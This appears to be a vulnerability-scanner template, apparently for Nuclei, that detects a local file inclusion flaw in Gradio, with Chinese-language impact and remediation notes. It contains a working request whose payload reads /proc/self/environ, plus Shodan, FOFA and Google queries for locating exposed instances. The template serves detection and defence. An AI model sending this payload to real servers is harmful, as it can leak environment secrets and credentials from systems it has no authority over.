id: gradio-lfi

info:
  name: Gradio - 本地文件包含漏洞
  author: ritikchaddha
  severity: critical
  description: |
    该模板用于检测 Gradio - 本地文件包含漏洞。该类漏洞通常源于文件路径或资源参数校验不足，导致攻击者可读取非预期文件。模板主要向 `/run/predict` 等路径发送探测请求，并根据响应中的 `url":`、`path":"` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可读取服务器本地文件、配置文件、源码或系统敏感文件。
    - 若读取到凭据、密钥或应用配置，可能进一步造成账号接管、数据库访问或远程代码执行。
  remediation: |
    - 使用固定文件 ID 或白名单映射访问文件，避免直接使用用户输入拼接文件路径。
    - 对路径进行规范化校验，拒绝目录穿越、协议包装器和绝对路径访问。
    - 降低 Web 进程文件权限，检查是否已有敏感文件被访问或泄露。
  reference:
    - https://huntr.com/bounties/936ef084-45e1-4dc5-a419-bca071189565
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22,CWE-73
  metadata:
    max-request: 1
    vendor: gradio_app
    product: gradio
    shodan-query:
      - http.html:"__gradio_mode__"
      - http.title:"gradio"
    fofa-query:
      - body="__gradio_mode__"
      - title="gradio"
    google-query: intitle:"gradio"
  tags: lfi,gradio

http:
  - raw:
      - |
        POST /run/predict HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'url":'
          - 'path":"'
          - 'data":[{'
          - 'FileData'
        condition: and

      - type: word
        part: content_type
        words:
          - application/json

      - type: status
        status:
          - 200
